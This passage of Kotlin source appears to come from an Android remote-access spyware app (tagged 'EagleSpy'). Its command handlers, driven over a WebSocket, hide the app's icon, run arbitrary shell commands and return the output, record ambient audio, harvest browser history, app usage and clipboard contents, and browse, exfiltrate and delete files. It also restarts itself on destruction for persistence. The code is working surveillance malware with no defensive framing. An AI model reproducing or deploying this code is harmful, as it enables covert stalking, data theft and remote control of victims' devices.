                    put("package", packageName)
                })
            } catch (e: Exception) {
                sendError("Uninstall app error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeLaunchApp(params: JSONObject?) {
        val packageName = params?.optString("package_name") ?: return sendError("Missing package_name")
        
        serviceScope.launch {
            try {
                val intent = packageManager.getLaunchIntentForPackage(packageName)
                if (intent != null) {
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                    sendResponse("app_launched", JSONObject().apply {
                        put("status", "success")
                        put("package", packageName)
                    })
                } else {
                    sendError("App not found: $packageName")
                }
            } catch (e: Exception) {
                sendError("Launch app error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeUnlockScreen() {
        serviceScope.launch {
            try {
                val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                
                val wakeLock = powerManager.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "EagleSpy:UnlockWakeLock"
                )
                wakeLock.acquire(10_000)
                
                sendResponse("screen_unlocked", JSONObject().apply {
                    put("status", "screen_on")
                    put("is_locked", keyguardManager.isKeyguardLocked)
                })
                
                wakeLock.release()
            } catch (e: Exception) {
                sendError("Unlock screen error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeHideIcon() {
        serviceScope.launch {
            try {
                val componentName = ComponentName(this@CommandService, "${packageName}.MainActivity")
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                sendResponse("icon_hidden", JSONObject().apply {
                    put("status", "hidden")
                })
            } catch (e: Exception) {
                sendError("Hide icon error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeShowIcon() {
        serviceScope.launch {
            try {
                val componentName = ComponentName(this@CommandService, "${packageName}.MainActivity")
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                sendResponse("icon_shown", JSONObject().apply {
                    put("status", "visible")
                })
            } catch (e: Exception) {
                sendError("Show icon error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeChangeAudioMode(params: JSONObject?) {
        val mode = params?.optString("mode") ?: return sendError("Missing mode")
        
        serviceScope.launch {
            try {
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                val audioMode = when(mode.lowercase()) {
                    "normal" -> AudioManager.MODE_NORMAL
                    "silent" -> AudioManager.RINGER_MODE_SILENT
                    "vibrate" -> AudioManager.RINGER_MODE_VIBRATE
                    else -> AudioManager.MODE_NORMAL
                }
                
                if (mode == "silent" || mode == "vibrate") {
                    audioManager.ringerMode = audioMode
                } else {
                    audioManager.mode = audioMode
                }
                
                sendResponse("audio_mode_changed", JSONObject().apply {
                    put("status", "success")
                    put("mode", mode)
                })
            } catch (e: Exception) {
                sendError("Change audio mode error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun executeGetWifiInfo() {
        serviceScope.launch {
            try {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                val wifiInfo = wifiManager.connectionInfo
                
                val info = JSONObject().apply {
                    put("ssid", wifiInfo.ssid?.replace("\"", "") ?: "Unknown")
                    put("bssid", wifiInfo.bssid ?: "Unknown")
                    put("ip_address", intToIp(wifiInfo.ipAddress))
                    put("link_speed", wifiInfo.linkSpeed)
                    put("rssi", wifiInfo.rssi)
                    put("mac_address", wifiInfo.macAddress ?: "Unknown")
                }
                
                sendResponse("wifi_info", info)
            } catch (e: Exception) {
                sendError("Get WiFi info error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun intToIp(address: Int): String {
        return "${address and 0xFF}.${(address shr 8) and 0xFF}.${(address shr 16) and 0xFF}.${(address shr 24) and 0xFF}"
    }

    private fun executeShellExec(params: JSONObject?) {
        val command = params?.optString("command") ?: return sendError("Missing command")
        
        serviceScope.launch {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                val output = process.inputStream.bufferedReader().readText()
                val error = process.errorStream.bufferedReader().readText()
                val exitCode = process.waitFor()
                
                sendResponse("shell_output", JSONObject().apply {
                    put("output", output)
                    put("error", error)
                    put("exit_code", exitCode)
                    put("command", command)
                })
            } catch (e: Exception) {
                sendError("Shell exec error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    private fun sendError(message: String) {
        sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }

    // === NEW FEATURE COMMAND HANDLERS ===

    private fun executeAmbientRecord(params: JSONObject?) {
        val duration = params?.optInt("duration", 60) ?: 60
        val intent = Intent(this, AmbientRecordingService::class.java).apply {
            putExtra("duration", duration)
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        sendResponse("ambient_record", JSONObject().apply {
            put("status", "recording_started")
            put("duration", duration)
        })
    }

    private fun executeGetAppUsage() {
        startService(Intent(this, AppUsageService::class.java))
        sendResponse("app_usage", JSONObject().apply {
            put("status", "collecting")
        })
    }

    private fun executeGetBrowserHistory() {
        startService(Intent(this, BrowserHistoryService::class.java))
        sendResponse("browser_history", JSONObject().apply {
            put("status", "collecting")
        })
    }

    private fun executeBrowseFiles(params: JSONObject?) {
        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "list_files")
            putExtra("params", JSONObject().apply {
                put("path", path)
                put("recursive", params?.optBoolean("recursive", false) ?: false)
            }.toString())
        }
        startService(intent)
        sendResponse("file_browser", JSONObject().apply {
            put("status", "listing")
            put("path", path)
        })
    }
    
    private fun executeListFiles(params: JSONObject?) {
        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
        val recursive = params?.optBoolean("recursive", false) ?: false
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "list_files")
            putExtra("params", JSONObject().apply {
                put("path", path)
                put("recursive", recursive)
            }.toString())
        }
        startService(intent)
    }

    private fun executeDownloadFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "download_file")
            putExtra("params", JSONObject().apply {
                put("path", path)
            }.toString())
        }
        startService(intent)
    }
    
    private fun executeUploadFile(params: JSONObject?) {
        params ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "upload_file")
            putExtra("params", params.toString())
        }
        startService(intent)
    }
    
    private fun executeUploadFileChunk(params: JSONObject?) {
        params ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "upload_file_chunk")
            putExtra("params", params.toString())
        }
        startService(intent)
    }
    
    private fun executeDeleteFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "delete_file")
            putExtra("params", JSONObject().apply {
                put("path", path)
            }.toString())
        }
        startService(intent)
    }
    
    private fun executePreviewFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "preview_file")
            putExtra("params", JSONObject().apply {
                put("path", path)
                put("max_size", params?.optLong("max_size", 1024 * 1024) ?: (1024 * 1024))
            }.toString())
        }
        startService(intent)
    }
    
    private fun executeRenameFile(params: JSONObject?) {
        params ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "rename_file")
            putExtra("params", params.toString())
        }
        startService(intent)
    }
    
    private fun executeMoveFile(params: JSONObject?) {
        params ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "move_file")
            putExtra("params", params.toString())
        }
        startService(intent)
    }
    
    private fun executeSearchFiles(params: JSONObject?) {
        params ?: return
        val intent = Intent(this, FileBrowserService::class.java).apply {
            putExtra("request_id", currentRequestId)
            putExtra("command", "search_files")
            putExtra("params", params.toString())
        }
        startService(intent)
    }

    private fun executeAddGeofence(params: JSONObject?) {
        params ?: return
        val intent = Intent(this, GeofenceService::class.java).apply {
            putExtra("action", "add")
            putExtra("latitude", params.optDouble("latitude", 0.0))
            putExtra("longitude", params.optDouble("longitude", 0.0))
            putExtra("radius", params.optDouble("radius", 200.0).toFloat())
            putExtra("label", params.optString("label", "zone_${System.currentTimeMillis()}"))
        }
        startService(intent)
        sendResponse("geofence", JSONObject().apply {
            put("status", "geofence_added")
        })
    }

    private fun executeStartClipboardMonitor() {
        val intent = Intent(this, ClipboardMonitorService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        sendResponse("clipboard_monitor", JSONObject().apply {
            put("status", "started")
        })
    }

    override fun onDestroy() {
        super.onDestroy()
        isConnected = false
        dataSyncManager.persistQueue()
        commandQueue.shutdown()
        webSocket?.close(1000, "Service destroyed")
        client?.dispatcher?.executorService?.shutdown()
        serviceScope.cancel()
        
        // Self-restart for persistence
        val restartIntent = Intent(this, CommandService::class.java)
        startService(restartIntent)
    }
}
